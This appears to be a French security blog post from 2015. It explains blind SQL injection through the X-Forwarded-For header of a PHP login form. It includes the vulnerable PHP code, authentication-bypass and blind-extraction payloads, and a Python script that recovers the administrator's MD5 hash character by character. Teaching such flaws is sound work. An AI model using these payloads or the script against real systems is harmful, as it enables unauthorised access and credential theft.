@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <title>Blind SQL injection via un header HTTP</title>
+    <meta name="description" content="" />
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="shortcut icon" href="//Techbrunch.github.io/hubpress.io/themes/Casper/favicon.ico">
+
+    <link rel="stylesheet" type="text/css" href="//Techbrunch.github.io/hubpress.io/themes/Casper/assets/css/screen.css?v=1.0.0" />
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400" />
+
+    <link rel="canonical" href="https://Techbrunch.github.io/hubpress.io/2015/01/31/Blind-SQL-injection-via-un-header-HTTP.html" />
+    
+    <meta property="og:site_name" content="" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Blind SQL injection via un header HTTP" />
+    <meta property="og:description" content="Cet article présente une façon originale d&amp;#8217;exploiter une faille de type injection SQL. La faille se trouve dans un formulaire d&amp;#8217;identification et plus précisément dans le code PHP qui ne contrôle pas tous les paramètres de..." />
+    <meta property="og:url" content="https://Techbrunch.github.io/hubpress.io/2015/01/31/Blind-SQL-injection-via-un-header-HTTP.html" />
+    <meta property="article:published_time" content="2015-01-30T23:00:00.000Z" />
+    <meta property="article:modified_time" content="2015-04-05T11:05:03.153Z" />
+    <meta property="article:tag" content="security" />
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="Blind SQL injection via un header HTTP" />
+    <meta name="twitter:description" content="Cet article présente une façon originale d&amp;#8217;exploiter une faille de type injection SQL. La faille se trouve dans un formulaire d&amp;#8217;identification et plus précisément dans le code PHP qui ne contrôle pas tous les paramètres de..." />
+    <meta name="twitter:url" content="https://Techbrunch.github.io/hubpress.io/2015/01/31/Blind-SQL-injection-via-un-header-HTTP.html" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "Article",
+    "publisher": "",
+    "author": {
+        "@type": "Person",
+        "name": null,
+        "image": "https://avatars.githubusercontent.com/u/1835765?v=3",
+        "url": "undefined/author/undefined",
+        "sameAs": "http://techbrunch.github.io/"
+    },
+    "headline": "Blind SQL injection via un header HTTP",
+    "url": "https://Techbrunch.github.io/hubpress.io/2015/01/31/Blind-SQL-injection-via-un-header-HTTP.html",
+    "datePublished": "2015-01-30T23:00:00.000Z",
+    "dateModified": "2015-04-05T11:05:03.153Z",
+    "keywords": "security",
+    "description": "Cet article présente une façon originale d&amp;#8217;exploiter une faille de type injection SQL. La faille se trouve dans un formulaire d&amp;#8217;identification et plus précisément dans le code PHP qui ne contrôle pas tous les paramètres de..."
+}
+    </script>
+
+    <meta name="generator" content="Ghost ?" />
+    <link rel="alternate" type="application/rss+xml" title="" href="https://Techbrunch.github.io/hubpress.io/rss" />
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/styles/default.min.css">
+</head>
+<body class="post-template tag-security">
+
+    
+
+
+<header class="main-header post-head no-cover">
+    <nav class="main-nav  clearfix">
+        <a class="back-button icon-arrow-left" href="https://Techbrunch.github.io/hubpress.io">Home</a>
+        <!-- <a class="subscribe-button icon-feed" href="https://Techbrunch.github.io/hubpress.io/rss/">Subscribe</a> -->
+    </nav>
+</header>
+
+<main class="content" role="main">
+
+    <article class="post tag-security">
+
+        <header class="post-header">
+            <h1 class="post-title">Blind SQL injection via un header HTTP</h1>
+            <section class="post-meta">
+                <time class="post-date" datetime="2015-01-31">31 January 2015</time>  on <a href="https://Techbrunch.github.io/hubpress.io/tag/security">security</a>
+            </section>
+        </header>
+
+        <section class="post-content">
+            <div class="paragraph">
+<p>Cet article présente une façon originale d&#8217;exploiter une faille de type injection SQL. La faille se trouve dans un formulaire d&#8217;identification et plus précisément dans le code PHP qui ne contrôle pas tous les paramètres de la requête SQL.</p>
+</div>
+<div class="paragraph">
+<p>Le code PHP est le suivant :</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-php" data-lang="php">&lt;?php
+$req = mysql_query("SELECT login,pwd FROM administrators
+                    WHERE login='".sanitize($_POST['login'])."'
+                    AND pwd='".md5($_POST['password'])."'
+                    AND ip='".ip()."'");</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>La variable login est correctement contrôlée grâce à la fonction <code>sanitize()</code> :</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-php" data-lang="php">&lt;?php
+function sanitize($param){
+    if (is_numeric($param)){
+    	return $param;
+	}
+	else{
+		return mysql_real_escape_string($param);
+	}
+}</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Et le mot de pass est directement converti en MD5, rien à faire de ce coté là. Intéressons nous au paramète <code>IP</code> et plus particulièrement à la fonction <code>ip()</code>.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-php" data-lang="php">&lt;?php
+function ip(){
+    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
+		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    }
+	else{
+		$ip = $_SERVER["REMOTE_ADDR"];
+    }
+
+	if (preg_match("#^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}#",$ip)){
+		return $ip;
+	}
+	else{
+		return $_SERVER["REMOTE_ADDR"];
+	}
+}</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>On remarque que la récupération de l&#8217;adresse ip repose sur un header <code>HTTP _X_FORWARDED_FOR</code> et que le seul contrôle effectué est un <code>preg_match</code> qui permet de vérifier que le paramètre contient bien au moins une adresse ip. Il est alors possible d&#8217;injecter du code SQL dans le header HTTP afin de bypasser l&#8217;identification voir même d&#8217;extraire les informations de la BDD.</p>
+</div>
+<div class="paragraph">
+<p>En modifiant le header par :</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>127.0.0.1' or 1=1#</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>La requête est forcément vraie et on se retrouve identifié \o/</p>
+</div>
+<div class="paragraph">
+<p>De la même manière on va pouvoir récupérer le password de l&#8217;administrateur, en effet lorsque la requete est fausse la page affiche "Mot de passe incorrect", en effectuant une <a href="http://www.ghostsinthestack.org/article-11-blind-sql-injections.html">blind SQL injection</a> il est possible de retrouver le mot de passe caractère par caractère, exemple :</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>127.0.0.1' or ascii(substring(pwd,1,1))=48#</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Si la requête est vraie et donc que l&#8217;on se retrouve identifié alors cela veut dire que le premier caractère du mot de passe est "0" (48 en ascii)</p>
+</div>
+<div class="paragraph">
+<p>J&#8217;ai écrit un petit script en python (mon premier) qui permet d&#8217;automatiser tout cela :</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-python" data-lang="python">import httplib
+import urllib
+import re
+
+password = ""
+
+md5 = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
+cpt = 0
+i = 1
+
+while i&lt;=32:
+
+	print 'Recherche du caractère '+str(i)
+	if cpt == 16:
+		cpt = 0
+
+	print 'Test caractere : '+md5[cpt]
+	params = urllib.urlencpt({'login': 'admin', 'pwd': 'password'})
+	headers = {"Content-type": "application/x-www-form-urlencptd",
+               "Accept": "text/plain",
+               "x-forwarded-for":"127.0.0.1' or ascii(substring(pwd,"+str(i)+",1))="+str(ord(md5[cpt]))+"#"}
+	conn = httplib.HTTPConnection("www.site.com:80")
+	conn.request("POST", "/index.php", params, headers)
+	response = conn.getresponse()
+	print response.status, response.reason
+	data = response.read()
+	conn.close()
+
+	if not(re.search('incorrect',data)):
+		print 'Caractère trouvé : '+md5[cpt]
+		password += md5[cpt]
+		i += 1
+		cpt = 0
+	else:
+		cpt += 1
+
+print 'MD5 = '+str(password)</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Et voila on trouve le hash et un passage par <a href="http://www.cmd5.org/">cmd5.org</a> ou par <a href="http://www.md5decrypter.co.uk/">md5decrypter.co.uk</a> nous donne la correspondance. Si vous avez des questions, commentaires n&#8217;hésitez pas.</p>
+</div>
+        </section>
+
+        <footer class="post-footer">
+
+
+            <figure class="author-image">
+                <a class="img" href="" style="background-image: url(https://avatars.githubusercontent.com/u/1835765?v=3)"><span class="hidden">'s Picture</span></a>
+            </figure>
+
+            <section class="author">
+                <h4><a href=""></a></h4>
+
+                    <p>Read <a href="">more posts</a> by this author.</p>
+                <div class="author-meta">
+                    
+                    <span class="author-link icon-link"><a href="http://techbrunch.github.io/">http://techbrunch.github.io/</a></span>
+                </div>
+            </section>
+
+
+            <section class="share">
+                <h4>Share this post</h4>
+                <a class="icon-twitter" href="https://twitter.com/share?text=Blind%20SQL%20injection%20via%20un%20header%20HTTP&amp;url=https://Techbrunch.github.io/hubpress.io/2015/01/31/Blind-SQL-injection-via-un-header-HTTP.html"
+                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <span class="hidden">Twitter</span>
+                </a>
+                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://Techbrunch.github.io/hubpress.io/2015/01/31/Blind-SQL-injection-via-un-header-HTTP.html"
+                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <span class="hidden">Facebook</span>
+                </a>
+                <a class="icon-google-plus" href="https://plus.google.com/share?url=https://Techbrunch.github.io/hubpress.io/2015/01/31/Blind-SQL-injection-via-un-header-HTTP.html"
+                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <span class="hidden">Google+</span>
+                </a>
+            </section>
+
+        </footer>
+
+
+    </article>
+
+</main>
+
+
+
+    <footer class="site-footer clearfix">
+        <section class="copyright"><a href="https://Techbrunch.github.io/hubpress.io"></a> &copy; 2015</section>
+        <section class="poweredby">Proudly published with <a href="http://hubpress.io">HubPress</a></section>
+    </footer>
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js?v="></script> <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.9.0/moment-with-locales.min.js?v="></script> <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/highlight.min.js?v="></script> 
+      <script type="text/javascript">
+        jQuery( document ).ready(function() {
+          // change date with ago
+          jQuery('ago.ago').each(function(){
+            var element = jQuery(this).parent();
+            element.html( moment(element.text()).fromNow());
+          });
+        });
+
+        hljs.initHighlightingOnLoad();      
+      </script>
+
+    <script type="text/javascript" src="//Techbrunch.github.io/hubpress.io/themes/Casper/assets/js/jquery.fitvids.js?v=1.0.0"></script>
+    <script type="text/javascript" src="//Techbrunch.github.io/hubpress.io/themes/Casper/assets/js/index.js?v=1.0.0"></script>
+
+</body>
+</html>
